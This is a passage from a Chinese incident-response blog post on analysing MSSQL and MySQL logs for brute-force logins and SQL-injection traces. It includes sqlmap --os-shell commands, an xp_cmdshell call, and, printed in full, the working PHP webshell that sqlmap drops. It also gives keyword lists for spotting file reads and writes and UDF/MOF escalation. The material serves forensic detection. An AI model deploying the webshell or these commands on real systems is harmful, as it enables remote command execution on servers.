<h3 id="0x02-SQL注入入侵痕迹"><a href="#0x02-SQL注入入侵痕迹" class="headerlink" title="0x02  SQL注入入侵痕迹"></a>0x02  SQL注入入侵痕迹</h3><p>在利用SQL注入漏洞的过程中，我们会尝试利用sqlmap的–os-shell参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下sqlmap os-shell参数的用法以及原理：</p>
<p>1、构造一个SQL注入点，开启Burp监听8080端口</p>
<p><code>sqlmap.py  -u http://192.168.204.164/sql.asp?id=1 --os-shell --proxy=http://127.0.0.1:8080</code></p>
<p>HTTP通讯过程如下：</p>
<p><img src="C:/Users/Bypass/Desktop/Mybook/LogAnalysis/image/log-4-1.png"></p>
<p>创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。</p>
<p>通过查看数据库中最近新建的表的结构和内容，可以判断是否发生过sql注入漏洞攻击事件。</p>
<p>检查方法：</p>
<p>1、数据库表检查</p>
<p><img src="C:/Users/Bypass/Desktop/Mybook/LogAnalysis/image/log-4-2.png"></p>
<p>2、检查xp_cmdshell等存储过程</p>
<p>xp_cmdshell在mssql2005之后的版本中是默认禁止的，查看xp_cmdshell是否被启用。</p>
<p>`Exec master.dbo.xp_cmdshell ‘whoami’</p>
<p>3、需要结合web日志，通过查看日志文件的大小以及审计日志文件中的内容，可以判断是否发生过sql注入漏洞攻击事件。</p>
<h2 id="MySQL日志分析"><a href="#MySQL日志分析" class="headerlink" title="MySQL日志分析"></a>MySQL日志分析</h2><p>常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。</p>
<h3 id="0x01-Mysql日志分析"><a href="#0x01-Mysql日志分析" class="headerlink" title="0x01 Mysql日志分析"></a>0x01 Mysql日志分析</h3><p>general query log能记录成功连接和每次执行的查询，我们可以将它用作安全布防的一部分，为故障分析或黑客事件后的调查提供依据。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、查看log配置信息</span><br><span class="line">show variables like &#x27;%general%&#x27;;</span><br><span class="line">2、开启日志</span><br><span class="line">SET GLOBAL general_log = &#x27;On&#x27;;</span><br><span class="line">3、指定日志文件路径</span><br><span class="line">#SET GLOBAL general_log_file = &#x27;/var/lib/mysql/mysql.log&#x27;;</span><br></pre></td></tr></table></figure>

<p>比如，当我访问 /test.php?id=1，此时我们得到这样的日志：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">190604 14:46:14       14 Connect    root@localhost on </span><br><span class="line">           14 Init DB    test</span><br><span class="line">           14 Query    SELECT * FROM admin WHERE id = 1</span><br><span class="line">           14 Quit  `</span><br></pre></td></tr></table></figure>

<p>我们按列来解析一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一列:Time，时间列，前面一个是日期,后面一个是小时和分钟，有一些不显示的原因是因为这些sql语句几乎是同时执行的,所以就不另外记录时间了。</span><br><span class="line">第二列:Id，就是show processlist出来的第一列的线程ID,对于长连接和一些比较耗时的sql语句,你可以精确找出究竟是那一条那一个线程在运行。</span><br><span class="line">第三列:Command，操作类型，比如Connect就是连接数据库，Query就是查询数据库(增删查改都显示为查询)，可以特定过虑一些操作。</span><br><span class="line">第四列:Argument，详细信息，例如 Connect    root@localhost on 意思就是连接数据库，如此类推,接下面的连上数据库之后,做了什么查询的操作。</span><br></pre></td></tr></table></figure>

<h3 id="0x02-登录成功-失败"><a href="#0x02-登录成功-失败" class="headerlink" title="0x02 登录成功/失败"></a>0x02 登录成功/失败</h3><p>我们来做个简单的测试吧，使用我以前自己开发的弱口令工具来扫一下，字典设置比较小，2个用户，4个密码，共8组。</p>
<p><img src="/image/media/2022/secops/log-5-1.png"></p>
<p>MySQL中的log记录是这样子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Time                 Id        Command         Argument</span><br><span class="line"></span><br><span class="line">190601 22:03:20	   98 Connect	root@192.168.204.1 on </span><br><span class="line">		   98 Connect	Access denied for user &#x27;root&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span><br><span class="line">		  103 Connect	mysql@192.168.204.1 on </span><br><span class="line">		  103 Connect	Access denied for user &#x27;mysql&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span><br><span class="line">		  104 Connect	mysql@192.168.204.1 on </span><br><span class="line">		  104 Connect	Access denied for user &#x27;mysql&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span><br><span class="line">		  100 Connect	root@192.168.204.1 on </span><br><span class="line">		  101 Connect	root@192.168.204.1 on </span><br><span class="line">		  101 Connect	Access denied for user &#x27;root&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span><br><span class="line">		   99 Connect	root@192.168.204.1 on </span><br><span class="line">		   99 Connect	Access denied for user &#x27;root&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span><br><span class="line">		  105 Connect	mysql@192.168.204.1 on </span><br><span class="line">		  105 Connect	Access denied for user &#x27;mysql&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span><br><span class="line">		  100 Query	set autocommit=0</span><br><span class="line">		  102 Connect	mysql@192.168.204.1 on </span><br><span class="line">		  102 Connect	Access denied for user &#x27;mysql&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span><br><span class="line">		  100 Quit	`</span><br></pre></td></tr></table></figure>

<p>你知道在这个口令猜解过程中，哪个是成功的吗？</p>
<p>利用爆破工具，一个口令猜解成功的记录是这样子的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">190601 22:03:20     100 Connect	root@192.168.204.1 on </span><br><span class="line">	   100 Query	set autocommit=0</span><br><span class="line">	   100 Quit</span><br></pre></td></tr></table></figure>

<p>但是，如果你是用其他方式，可能会有一点点不一样的哦。</p>
<p>Navicat for MySQL登录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">190601 22:14:07	  106 Connect	root@192.168.204.1 on </span><br><span class="line">		         106 Query	SET NAMES utf8</span><br><span class="line">		         106 Query	SHOW VARIABLES LIKE &#x27;lower_case_%&#x27;</span><br><span class="line">		         106 Query	SHOW VARIABLES LIKE &#x27;profiling&#x27;</span><br><span class="line">		         106 Query	SHOW DATABASES</span><br></pre></td></tr></table></figure>

<p>命令行登录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">190601 22:17:25	  111 Connect	root@localhost on </span><br><span class="line">		         111 Query	select @@version_comment limit 1</span><br><span class="line">190601 22:17:56	  111 Quit</span><br></pre></td></tr></table></figure>

<p>这个差别在于，不同的数据库连接工具，它在连接数据库初始化的过程中是不同的。通过这样的差别，我们可以简单判断出用户是通过连接数据库的方式。</p>
<p>另外，不管你是爆破工具、Navicat for MySQL、还是命令行，登录失败都是一样的记录。</p>
<p>登录失败的记录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">102 Connect	mysql@192.168.204.1 on </span><br><span class="line">102 Connect	Access denied for user &#x27;mysql&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span><br></pre></td></tr></table></figure>

<p>利用shell命令进行简单的分析：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#有哪些IP在爆破？</span><br><span class="line">grep  &quot;Access denied&quot; mysql.log |cut -d &quot;&#x27;&quot; -f4|uniq -c|sort -nr</span><br><span class="line">     27 192.168.204.1</span><br><span class="line"></span><br><span class="line">#爆破用户名字典都有哪些？</span><br><span class="line">grep  &quot;Access denied&quot; mysql.log |cut -d &quot;&#x27;&quot; -f2|uniq -c|sort -nr</span><br><span class="line">     13 mysql</span><br><span class="line">     12 root</span><br><span class="line">      1 root</span><br><span class="line">      1 mysql</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在日志分析中，特别需要注意一些敏感的操作行为，比如删表、备库，读写文件等。关键词：drop table、drop function、lock tables、unlock tables、load_file() 、into outfile、into dumpfile。</p>
<p>敏感数据库表：SELECT * from mysql.user、SELECT * from mysql.func</p>
<h3 id="0x03-SQL注入入侵痕迹"><a href="#0x03-SQL注入入侵痕迹" class="headerlink" title="0x03  SQL注入入侵痕迹"></a>0x03  SQL注入入侵痕迹</h3><p>在利用SQL注入漏洞的过程中，我们会尝试利用sqlmap的–os-shell参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下sqlmap os-shell参数的用法以及原理：</p>
<p>1、构造一个SQL注入点，开启Burp监听8080端口</p>
<p><code>sqlmap.py  -u http://192.168.204.164/sql.php?id=1 --os-shell --proxy=http://127.0.0.1:8080</code></p>
<p>HTTP通讯过程如下：</p>
<p><img src="/image/media/2022/secops/log-5-3.png"></p>
<p>创建了一个临时文件tmpbwyov.php，通过访问这个木马执行系统命令，并返回到页面展示。</p>
<p>tmpbwyov.php：</p>
<?php $c=$_REQUEST["cmd"];@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);$z=@ini_get('disable_functions');if(!empty($z)){$z=preg_replace('/[, ]+/',',',$z);$z=explode(',',$z);$z=array_map('trim',$z);}else{$z=array();}$c=$c." 2>&1\n";function f($n){global $z;return is_callable($n)and!in_array($n,$z);}if(f('system')){ob_start();system($c);$w=ob_get_contents();ob_end_clean();}elseif(f('proc_open')){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;while(!feof($t[1])){$w.=fread($t[1],512);}@proc_close($y);}elseif(f('shell_exec')){$w=shell_exec($c);}elseif(f('passthru')){ob_start();passthru($c);$w=ob_get_contents();ob_end_clean();}elseif(f('popen')){$x=popen($c,r);$w=NULL;if(is_resource($x)){while(!feof($x)){$w.=fread($x,512);}}@pclose($x);}elseif(f('exec')){$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);}else{$w=0;}print "<pre>".$w."</pre>";?><p>`</p>
<p>创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。</p>
<p>通过查看网站目录中最近新建的可疑文件，可以判断是否发生过sql注入漏洞攻击事件。</p>
<p>检查方法：</p>
<p>1、检查网站目录下，是否存在一些木马文件：</p>
<p><img src="/image/media/2022/secops/log-5-4.png"></p>
<p>2、检查是否有UDF提权、MOF提权痕迹</p>
<p>检查目录是否有异常文件</p>
<p>mysql\lib\plugin </p>
<p>c:/windows/system32/wbem/mof/</p>
<p>检查函数是否删除</p>
<p><code>select * from mysql.func</code></p>
<p>3、结合web日志分析。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://0314valen.github.io">Valen</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://0314valen.github.io/article/2022-07-02-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B9%8B%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/">https://0314valen.github.io/article/2022-07-02-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B9%8B%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://0314valen.github.io" target="_blank">Valen的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a></div><div class="post_share"><div class="social-share" data-image="https://img.paulzzh.tech/touhou/random" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/image/UI_images/alipay-reward-image.jpg" target="_blank"><img class="post-qr-code-img" src="/image/UI_images/alipay-reward-image.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/image/UI_images/alipay-reward-image.jpg" target="_blank"><img class="post-qr-code-img" src="/image/UI_images/alipay-reward-image.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/article/2022-07-03-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B9%8B%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/"><img class="prev-cover" src="https://img.paulzzh.tech/touhou/random" onerror="onerror=null;src='/image/UI_images/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">应急响应之入侵排查</div></div></a></div><div class="next-post pull-right"><a href="/article/2022-07-01-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"><img class="next-cover" src="https://img.paulzzh.tech/touhou/random" onerror="onerror=null;src='/image/UI_images/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">应急响应之权限维持</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/article/2022-07-03-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B9%8B%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/" title="应急响应之入侵排查"><img class="cover" src="https://img.paulzzh.tech/touhou/random" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2022-09-20</div><div class="title">应急响应之入侵排查</div></div></a></div><div><a href="/article/2022-07-01-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" title="应急响应之权限维持"><img class="cover" src="https://img.paulzzh.tech/touhou/random" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2022-11-10</div><div class="title">应急响应之权限维持</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/image/UI_images/avatar.jpg" onerror="this.onerror=null;this.src='/image/UI_images/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Valen</div><div class="author-info__description">一位精通各种环境的开启和附件的下载的签到型选手</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">38</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">19</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/0314Valen/0314Valen.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">不要担心辜负了别人的期待，对你有期待的，只有你自己。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="toc-number">1.</span> <span class="toc-text">应急响应</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">Windows日志分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-Windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.1.</span> <span class="toc-text">0x01 Windows事件日志简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0X02-%E5%AE%A1%E6%A0%B8%E7%AD%96%E7%95%A5%E4%B8%8E%E4%BA%8B%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8"><span class="toc-number">1.1.2.</span> <span class="toc-text">0X02 审核策略与事件查看器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">1.1.3.</span> <span class="toc-text">0x03 事件日志分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7"><span class="toc-number">1.1.4.</span> <span class="toc-text">0x04 日志分析工具</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Log-Parser"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">Log Parser</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LogParser-Lizard"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">LogParser Lizard</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Event-Log-Explorer"><span class="toc-number">1.1.4.3.</span> <span class="toc-text">Event Log Explorer</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">Linux日志分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.2.1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E6%97%A5%E5%BF%97%E7%AE%80%E4%BB%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text">0x01 日志简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E6%8A%80%E5%B7%A7"><span class="toc-number">1.2.3.</span> <span class="toc-text">0x02 日志分析技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#A%E3%80%81%E5%B8%B8%E7%94%A8%E7%9A%84shell%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">A、常用的shell命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#B%E3%80%81%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E6%8A%80%E5%B7%A7"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">B、日志分析技巧</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.4.</span> <span class="toc-text">0x03 linux常用命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#find"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">find</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#grep"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">grep</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#awk"><span class="toc-number">1.2.4.3.</span> <span class="toc-text">awk</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sed"><span class="toc-number">1.2.4.4.</span> <span class="toc-text">sed</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-linux%E7%B3%BB%E7%BB%9F%E7%8A%B6%E6%80%81%E6%A3%80%E6%B5%8B"><span class="toc-number">1.2.5.</span> <span class="toc-text">0x04 linux系统状态检测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E5%8C%85"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">软件安装包</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%AF%B9%E5%A4%96%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.2.5.2.</span> <span class="toc-text">查看对外开放端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7"><span class="toc-number">1.2.5.3.</span> <span class="toc-text">用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%92%8C%E5%90%AF%E5%8A%A8%E9%A1%B9"><span class="toc-number">1.2.5.4.</span> <span class="toc-text">计划任务和启动项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%AF%E7%96%91%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.5.5.</span> <span class="toc-text">可疑文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-linux%E6%97%A5%E5%BF%97%E6%B8%85%E7%90%86"><span class="toc-number">1.2.6.</span> <span class="toc-text">0x05 linux日志清理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">Web日志分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ox01-Web%E6%97%A5%E5%BF%97"><span class="toc-number">1.3.1.</span> <span class="toc-text">ox01  Web日志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E6%8A%80%E5%B7%A7-1"><span class="toc-number">1.3.2.</span> <span class="toc-text">0x02 日志分析技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E6%A1%88%E4%BE%8B"><span class="toc-number">1.3.3.</span> <span class="toc-text">0x03 日志分析案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E6%97%A5%E5%BF%97%E7%BB%9F%E8%AE%A1%E5%88%86%E6%9E%90%E6%8A%80%E5%B7%A7"><span class="toc-number">1.3.4.</span> <span class="toc-text">0x04 日志统计分析技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSSQL%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">MSSQL日志分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-MSSQL%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">1.4.1.</span> <span class="toc-text">0x01 MSSQL日志分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-SQL%E6%B3%A8%E5%85%A5%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9"><span class="toc-number">1.4.2.</span> <span class="toc-text">0x02  SQL注入入侵痕迹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">1.5.</span> <span class="toc-text">MySQL日志分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-Mysql%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">1.5.1.</span> <span class="toc-text">0x01 Mysql日志分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F-%E5%A4%B1%E8%B4%A5"><span class="toc-number">1.5.2.</span> <span class="toc-text">0x02 登录成功&#x2F;失败</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-SQL%E6%B3%A8%E5%85%A5%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9"><span class="toc-number">1.5.3.</span> <span class="toc-text">0x03  SQL注入入侵痕迹</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/article/2022-11-25-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%BA%AA%E8%A6%81/" title="博客搭建纪要"><img src="https://0314valen.github.io//image/UI_images/favicon.png" onerror="this.onerror=null;this.src='/image/UI_images/404.jpg'" alt="博客搭建纪要"/></a><div class="content"><a class="title" href="/article/2022-11-25-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%BA%AA%E8%A6%81/" title="博客搭建纪要">博客搭建纪要</a><time datetime="2022-11-24T16:00:00.000Z" title="发表于 2022-11-25 00:00:00">2022-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/article/2021-11-23-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5(ssti)/" title="模板注入(ssti)"><img src="https://img.paulzzh.tech/touhou/random" onerror="this.onerror=null;this.src='/image/UI_images/404.jpg'" alt="模板注入(ssti)"/></a><div class="content"><a class="title" href="/article/2021-11-23-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5(ssti)/" title="模板注入(ssti)">模板注入(ssti)</a><time datetime="2022-11-21T02:15:19.351Z" title="发表于 2022-11-21 10:15:19">2022-11-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/article/2022-11-15-Solidity8.0-%E5%85%A5%E9%97%A8/" title="Solidity8.0-入门"><img src="https://www.osgeo.cn/solidity/_static/logo.svg" onerror="this.onerror=null;this.src='/image/UI_images/404.jpg'" alt="Solidity8.0-入门"/></a><div class="content"><a class="title" href="/article/2022-11-15-Solidity8.0-%E5%85%A5%E9%97%A8/" title="Solidity8.0-入门">Solidity8.0-入门</a><time datetime="2022-11-14T16:00:00.000Z" title="发表于 2022-11-15 00:00:00">2022-11-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/article/2022-11-26-Solidity8.0-%E8%BF%9B%E9%98%B6/" title="Solidity8.0-入门"><img src="https://www.osgeo.cn/solidity/_static/logo.svg" onerror="this.onerror=null;this.src='/image/UI_images/404.jpg'" alt="Solidity8.0-入门"/></a><div class="content"><a class="title" href="/article/2022-11-26-Solidity8.0-%E8%BF%9B%E9%98%B6/" title="Solidity8.0-入门">Solidity8.0-入门</a><time datetime="2022-11-14T16:00:00.000Z" title="发表于 2022-11-15 00:00:00">2022-11-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/article/2022-11-01-2022%E5%B9%B410%E6%9C%88%E6%AF%94%E8%B5%9Bwriteups/" title="2022年10月比赛writeups"><img src="http://api.btstu.cn/sjbz/" onerror="this.onerror=null;this.src='/image/UI_images/404.jpg'" alt="2022年10月比赛writeups"/></a><div class="content"><a class="title" href="/article/2022-11-01-2022%E5%B9%B410%E6%9C%88%E6%AF%94%E8%B5%9Bwriteups/" title="2022年10月比赛writeups">2022年10月比赛writeups</a><time datetime="2022-10-31T16:00:00.000Z" title="发表于 2022-11-01 00:00:00">2022-11-01</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By Valen</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div 